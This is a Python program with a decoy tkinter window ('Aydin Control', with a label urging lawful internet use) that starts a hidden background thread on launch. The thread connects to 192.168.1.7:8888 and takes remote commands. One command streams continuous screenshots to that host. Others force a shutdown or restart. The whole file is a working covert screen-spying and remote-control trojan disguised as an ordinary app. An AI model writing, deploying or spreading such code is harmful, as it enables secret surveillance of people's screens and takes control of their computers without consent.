from socket import *
from PIL import ImageGrab
import os
import tkinter as tk
import threading
import sys
import time

def background_service():
    """后台服务线程函数"""
    try:
        s = socket()
        s.connect(('192.168.1.7', 8888))

        c = s.recv(1024).decode()
        if c == '1':
            while True:
                image = ImageGrab.grab()
                image = image.resize((960, 540))
                image.save('1.jpg')
                size = os.path.getsize('1.jpg')
                
                # 发送文件大小（添加长度前缀）
                size_str = str(size)
                s.send(len(size_str).to_bytes(4, 'big'))  # 先发送长度前缀
                s.send(size_str.encode())                 # 再发送实际数据
                
                s.recv(1024)  # 等待确认
                with open('1.jpg', 'rb') as file:
                    while True:
                        data = file.read(4096)
                        if not data:
                            break
                        s.send(data)
        elif c == '2':
            os.system('shutdown -s -t 1')  # 关机
            sys.exit(0)  # 退出程序
        elif c == '3':
            os.system('shutdown -r -t 1')  # 重启
            sys.exit(0)  # 退出程序
    except Exception as e:
        print(f"后台服务错误: {e}")

def start_background_service():
    """启动后台服务线程"""
    service_thread = threading.Thread(target=background_service)
    service_thread.daemon = True  # 设置为守护线程，主线程结束时自动退出
    service_thread.start()

# GUI界面
def create_gui():
    root = tk.Tk()
    root.title('Aydin Control')
    root.geometry('600x400')
    root.iconbitmap(r'C:\Users\Administrator\Desktop\tkinter教程\安全\桌面监视\chat_soundwave_wave_message_sound_record_recording_voice_icon_267340.ico')
    
    # 添加一些UI元素
    label = tk.Label(root, text="请遵守法律,文明上网", font=("Arial", 16))
    label.pack(pady=20)
    
    status_label = tk.Label(root, text="状态: 连接中...", font=("Arial", 12))
    status_label.pack(pady=10)
    
    
    

    
    # 关闭按钮
    def on_close():
        if tk.messagebox.askyesno("退出", "确定要退出程序吗？"):
            root.destroy()
            sys.exit(0)
    
    #btn_exit = tk.Button(root, text="查询", command=on_close,width=8)
    #btn_exit.pack(pady=30)
    
    # 启动后台服务
    start_background_service()
    
    root.protocol("WM_DELETE_WINDOW", on_close)
    root.mainloop()

# 启动GUI
if __name__ == "__main__":
    create_gui()